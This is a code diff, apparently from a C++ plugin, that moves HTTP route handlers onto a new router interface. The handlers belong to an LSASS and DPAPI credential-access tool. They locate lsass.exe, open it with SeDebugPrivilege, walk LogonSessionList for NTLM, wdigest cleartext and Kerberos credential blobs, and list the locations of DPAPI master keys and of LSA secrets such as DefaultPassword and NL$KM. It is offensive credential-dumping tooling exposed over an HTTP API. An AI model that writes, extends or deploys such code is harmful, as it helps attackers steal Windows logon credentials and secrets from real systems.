@@ -1,5 +1,5 @@
 #include "plugin.h"
-#include "../http_router.h"
+#include "http/c_http_router.h"
 #include <nlohmann/json.hpp>
 #include <tlhelp32.h>
 using json = nlohmann::json;
@@ -9,7 +9,7 @@ namespace handlers {
 void register_lsass_dpapi_routes(c_http_router& router) {
 
     // Enumerate LSASS logon sessions by locating the process
-    router.post("/api/lsass/list_sessions", [](const httplib::Request& req, httplib::Response& res) {
+    router.post("/api/lsass/list_sessions", [](const s_http_request& req) {
         json result;
         result["sessions"] = json::array();
 
@@ -32,8 +32,7 @@ void register_lsass_dpapi_routes(c_http_router& router) {
         result["lsass_pid"] = lsassPid;
         if (lsassPid == 0) {
             result["error"] = "lsass.exe not found in process list";
-            res.set_content(result.dump(), "application/json");
-            return;
+            return s_http_response::ok(result);
         }
 
         // Open lsass with read privileges (requires SeDebugPrivilege)
@@ -87,11 +86,11 @@ void register_lsass_dpapi_routes(c_http_router& router) {
         }
 
         result["note"] = "Requires SeDebugPrivilege. LogonSessionList walker locates credential blobs for msv1_0 (NTLM), wdigest (cleartext if enabled), and kerberos SSP packages.";
-        res.set_content(result.dump(), "application/json");
+        return s_http_response::ok(result);
     });
 
     // Read credential blob structure offsets
-    router.post("/api/lsass/read_credential_blobs", [](const httplib::Request& req, httplib::Response& res) {
+    router.post("/api/lsass/read_credential_blobs", [](const s_http_request& req) {
         json body;
         try { body = json::parse(req.body); } catch (...) { body = json::object(); }
 
@@ -125,11 +124,11 @@ void register_lsass_dpapi_routes(c_http_router& router) {
             {"lsass_cache","LogonSessionList -> DpapiKey field -> _DPAPI_MASTER_KEY_CACHE"},
             {"guid_format","XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX"}
         };
-        res.set_content(result.dump(), "application/json");
+        return s_http_response::ok(result);
     });
 
     // Locate DPAPI master keys in LSASS memory
-    router.post("/api/lsass/locate_dpapi_keys", [](const httplib::Request& req, httplib::Response& res) {
+    router.post("/api/lsass/locate_dpapi_keys", [](const s_http_request& req) {
         json result;
         result["dpapi_architecture"] = {
             {"master_key_store","\\Microsoft\\Protect\\<SID>\\<GUID>"},
@@ -151,8 +150,10 @@ void register_lsass_dpapi_routes(c_http_router& router) {
             "DefaultPassword (autologon credential)",
             "NL$KM (domain cached credential key)"
         };
-        res.set_content(result.dump(), "application/json");
+        return s_http_response::ok(result);
     });
 }
 
 } // namespace handlers
+
+
